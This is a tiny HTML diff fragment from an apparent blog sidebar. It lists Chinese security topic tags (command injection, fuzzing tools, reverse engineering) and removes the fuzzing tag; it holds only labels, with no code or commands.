         <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
-    
-        <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
     
         <span class="sidebar-tag-name" data-tags="逆向破解"><span class="iconfont-archer">&#xe606;</span>逆向破解</span>
     
